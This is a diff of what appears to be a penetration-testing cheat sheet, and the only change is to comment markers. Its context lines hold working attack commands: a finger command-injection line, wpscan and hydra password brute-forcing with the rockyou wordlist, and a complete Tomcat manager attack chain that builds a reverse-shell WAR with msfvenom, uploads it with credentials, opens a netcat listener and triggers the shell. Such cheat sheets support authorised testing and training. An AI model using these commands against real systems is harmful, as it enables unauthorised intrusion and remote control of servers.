@@ -107,9 +107,9 @@ finger "|/bin/ls -a /<IP>"`
 (Do not forget to change file formats and supply correct directory list like above)
 **Wordpress**
 _Enumeration_
-`/# Scan
+`\# Scan
 wpscan --rua -e --url IP/URL
-/# Brute force users/login
+\# Brute force users/login
 wpscan --rua --url IP/URL -P /usr/share/wordlists/rockyou.txt -U "USER,USER"`
 _Theme RCE_
 `
@@ -161,19 +161,19 @@ _Brute Force_
 `hydra -L USER_LIST -P /usr/share/wordlists/rockyou.txt -f IP http-get /manager/html -vV -u`
 _Panel RCE_
 `
-/# Generate payload
+\# Generate payload
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
 
-/# Upload payload
+\# Upload payload
 Tomcat6 :
 wget 'http://USER:PASSWORD@IP:8080/manager/deploy?war=file:shell.war&path=/shell' -O -
 
 Tomcat7 and above :
 curl -v -u USER:PASSWORD -T shell.war 'http://IP:8080/manager/text/deploy?path=/shellh&update=true'
 
-/# Listener
+\# Listener
 nc -nvlp PORT
 
-/# Execute payload
+\# Execute payload
 curl http://IP:8080/shell/
 `
